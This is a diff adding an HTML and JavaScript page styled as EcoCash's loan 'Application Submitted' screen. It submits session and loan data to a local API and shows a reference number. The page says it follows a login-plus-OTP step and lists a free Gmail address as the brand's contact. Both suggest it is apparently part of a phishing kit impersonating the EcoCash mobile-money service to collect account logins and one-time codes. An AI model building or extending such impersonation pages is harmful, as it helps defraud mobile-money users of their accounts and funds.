@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>EcoCash – Application Submitted</title>
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet"/>
+    <style>
+        *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+        body{font-family:'Nunito',sans-serif;background:#f7f9fc;min-height:100vh;display:flex;flex-direction:column;}
+        .header{background:#fff;padding:1rem 1.5rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #e5e5e5;}
+        .logo{font-size:1.8rem;font-weight:800;}
+        .logo .blue{color:#003087;} .logo .red{color:#d0021b;}
+        .menu{font-size:1.5rem;cursor:pointer;color:#1a1a1a;}
+        .container{flex:1;display:flex;align-items:center;justify-content:center;padding:1.5rem;}
+        .card{background:#fff;border-radius:20px;padding:2.5rem 1.5rem;text-align:center;max-width:420px;width:100%;box-shadow:0 4px 20px rgba(0,0,0,.08);animation:slideUp .4s ease-out;}
+        @keyframes slideUp{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+        .icon{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#00c97a,#00a86b);display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;font-size:2.5rem;color:#fff;box-shadow:0 4px 12px rgba(0,201,122,.3);}
+        .icon.loading{background:linear-gradient(135deg,#8b9fd4,#003087);animation:pulse 1.5s ease-in-out infinite;}
+        @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.6;}}
+        h2{color:#00c97a;font-size:1.5rem;font-weight:800;margin-bottom:.5rem;}
+        .subheading{color:#666;font-size:.95rem;margin-bottom:1.5rem;}
+        .reference-box{background:#f0f9f6;border:2px solid #00c97a;border-radius:16px;padding:1rem;margin-bottom:1.5rem;}
+        .reference-label{color:#666;font-size:.85rem;margin-bottom:.3rem;font-weight:600;}
+        .reference-number{font-family:'Courier New',monospace;font-size:1.3rem;font-weight:800;color:#003087;word-break:break-all;user-select:all;}
+        .btn-copy{display:inline-block;padding:.5rem 1rem;background:#fff;color:#003087;border:1px solid #ddd;border-radius:12px;font-size:.85rem;font-weight:700;cursor:pointer;margin-top:.75rem;transition:all .2s;font-family:'Nunito',sans-serif;}
+        .btn-copy:hover{background:#f0f4ff;border-color:#003087;}
+        .btn-copy:disabled{opacity:.5;cursor:not-allowed;}
+        .timeline{background:#f9fafb;border-radius:16px;padding:1.5rem;margin:1.5rem 0;text-align:left;}
+        .timeline-title{font-weight:800;color:#1a1a1a;margin-bottom:1rem;font-size:.95rem;}
+        .timeline-step{display:flex;margin-bottom:1rem;position:relative;}
+        .timeline-step:last-child{margin-bottom:0;}
+        .timeline-step:not(:last-child)::after{content:'';position:absolute;left:15px;top:32px;width:2px;height:40px;background:#e0e0e0;}
+        .timeline-circle{width:32px;height:32px;border-radius:50%;background:#003087;color:#fff;display:flex;align-items:center;justify-content:center;font-size:.9rem;font-weight:700;flex-shrink:0;margin-right:1rem;position:relative;z-index:1;}
+        .timeline-content h4{font-size:.9rem;color:#1a1a1a;font-weight:800;margin-bottom:.25rem;}
+        .timeline-content p{font-size:.8rem;color:#666;line-height:1.4;}
+        .message{color:#1a1a1a;font-size:.95rem;line-height:1.6;margin-bottom:1.5rem;padding:1rem;background:#f0f9f6;border-left:4px solid #00c97a;border-radius:12px;}
+        .action-buttons{display:flex;flex-direction:column;gap:.8rem;margin-top:1.5rem;}
+        .btn-primary{display:flex;align-items:center;justify-content:center;width:100%;padding:1rem;background:#003087;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:800;cursor:pointer;text-decoration:none;text-align:center;text-transform:uppercase;transition:background .2s;gap:.5rem;font-family:'Nunito',sans-serif;}
+        .btn-primary:hover{background:#002060;}
+        .btn-secondary{display:flex;align-items:center;justify-content:center;width:100%;padding:1rem;background:#f7f9fc;color:#003087;border:2px solid #003087;border-radius:16px;font-size:1rem;font-weight:700;cursor:pointer;text-decoration:none;text-align:center;text-transform:uppercase;transition:all .2s;gap:.5rem;font-family:'Nunito',sans-serif;}
+        .btn-secondary:hover{background:#003087;color:#fff;}
+        .error-msg{color:#d0021b;font-size:.9rem;margin:1rem 0;padding:.75rem 1rem;background:#fff5f5;border-radius:12px;border-left:4px solid #d0021b;display:none;}
+        .error-msg.show{display:block;}
+        .bottom{background:#003087;color:#fff;padding:2rem 1.5rem;text-align:center;width:100%;}
+        .footer{color:rgba(255,255,255,.8);font-size:.75rem;}
+        .footer a{color:rgba(255,255,255,.9);}
+        @media(max-width:480px){.container{padding:1rem;}.card{padding:1.5rem;}}
+    </style>
+</head>
+<body>
+<div class="header">
+    <div class="logo"><span class="blue">Eco</span><span class="red">Cash</span></div>
+    <div class="menu">☰</div>
+</div>
+<div class="container">
+    <div class="card" id="main-card">
+        <!-- Content injected by JS after loan submission -->
+    </div>
+</div>
+<div class="bottom">
+    <div class="footer">
+        <p>v4.0.1P</p>
+        <p><a href="mailto:loansecocash8@gmail.com" style="color:rgba(255,255,255,.9);">loansecocash8@gmail.com</a></p>
+        <p>By using EcoCash you agree to our <a href="#">Terms and Conditions</a></p>
+    </div>
+</div>
+
+<script>
+    // This page is reached after login + OTP verification.
+    // It reads the loan data saved by loan-application, submits it to the server,
+    // then displays the result.
+
+    const card = document.getElementById('main-card');
+
+    function showSubmitting() {
+        card.innerHTML = `
+            <div class="icon loading">⏳</div>
+            <h2 style="color:#003087;">Submitting...</h2>
+            <p class="subheading">Please wait while we process your application</p>
+        `;
+    }
+
+    function showSuccess(ref) {
+        card.innerHTML = `
+            <div class="icon">✓</div>
+            <h2>Application Submitted!</h2>
+            <p class="subheading">Your loan application has been successfully submitted</p>
+            <div class="reference-box">
+                <div class="reference-label">Your Reference Number</div>
+                <div class="reference-number" id="reference-display">${ref}</div>
+                <button class="btn-copy" id="copy-btn" onclick="copyReference()">📋 Copy Reference</button>
+            </div>
+            <div class="message">
+                <strong>What's next?</strong><br/>
+                Our team will review your application and notify you within 24 hours.
+                You can check the status anytime using your reference number.
+            </div>
+            <div class="timeline">
+                <div class="timeline-title">What to Expect</div>
+                <div class="timeline-step">
+                    <div class="timeline-circle">1</div>
+                    <div class="timeline-content"><h4>Application Received ✓</h4><p>Your application is now being processed</p></div>
+                </div>
+                <div class="timeline-step">
+                    <div class="timeline-circle">2</div>
+                    <div class="timeline-content"><h4>Under Review (1–24 hours)</h4><p>Our team is evaluating your application</p></div>
+                </div>
+                <div class="timeline-step">
+                    <div class="timeline-circle">3</div>
+                    <div class="timeline-content"><h4>Decision Notification</h4><p>You'll receive an SMS with the decision</p></div>
+                </div>
+                <div class="timeline-step">
+                    <div class="timeline-circle">4</div>
+                    <div class="timeline-content"><h4>Funds Disbursed</h4><p>If approved, funds sent to your EcoCash wallet</p></div>
+                </div>
+            </div>
+            <div class="action-buttons">
+                <a href="/" class="btn-primary">🏠 Back to Home</a>
+                <a href="/" class="btn-secondary">➕ Apply for Another Loan</a>
+            </div>
+        `;
+    }
+
+    function showError(msg) {
+        card.innerHTML = `
+            <div class="icon" style="background:linear-gradient(135deg,#ef4444,#b91c1c);">✗</div>
+            <h2 style="color:#d0021b;">Submission Failed</h2>
+            <p class="subheading">We could not submit your application</p>
+            <div class="error-msg show">${msg}</div>
+            <div class="action-buttons">
+                <a href="/loan-application" class="btn-primary">↩ Try Again</a>
+                <a href="/" class="btn-secondary">🏠 Back to Home</a>
+            </div>
+        `;
+    }
+
+    function copyReference() {
+        const ref = document.getElementById('reference-display')?.textContent;
+        if (!ref) return;
+        navigator.clipboard.writeText(ref).then(() => {
+            const btn = document.getElementById('copy-btn');
+            const orig = btn.textContent;
+            btn.textContent = '✅ Copied!';
+            setTimeout(() => { btn.textContent = orig; }, 2000);
+        }).catch(() => { alert('Reference: ' + ref); });
+    }
+
+    async function submitLoan() {
+        const sessionId = sessionStorage.getItem('session_id');
+        const loanRaw   = sessionStorage.getItem('loan_data');
+
+        // Guard: if no session or no loan data, something went wrong — send back
+        if (!sessionId || !loanRaw) {
+            showError('Session data missing. Please start your application again.');
+            setTimeout(() => { window.location.href = '/loan-application'; }, 3000);
+            return;
+        }
+
+        let loanData;
+        try {
+            loanData = JSON.parse(loanRaw);
+        } catch {
+            showError('Application data is corrupted. Please start again.');
+            setTimeout(() => { window.location.href = '/loan-application'; }, 3000);
+            return;
+        }
+
+        showSubmitting();
+
+        try {
+            const res    = await fetch('/api/submit-loan', {
+                method:  'POST',
+                headers: {'Content-Type': 'application/json'},
+                body:    JSON.stringify({ session_id: sessionId, ...loanData })
+            });
+            const result = await res.json();
+
+            if (result.success) {
+                // Clean up session — keep nothing sensitive
+                sessionStorage.removeItem('session_id');
+                sessionStorage.removeItem('verified');
+                sessionStorage.removeItem('loan_data');
+                sessionStorage.removeItem('phone');
+                sessionStorage.setItem('loan_reference', result.reference);
+                showSuccess(result.reference);
+            } else {
+                showError(result.error || 'Submission failed. Please try again.');
+            }
+        } catch {
+            showError('Could not reach the server. Please check your connection and try again.');
+        }
+    }
+
+    submitLoan();
+</script>
+<script src="/chat-widget.js"></script>
+</body>
+</html>
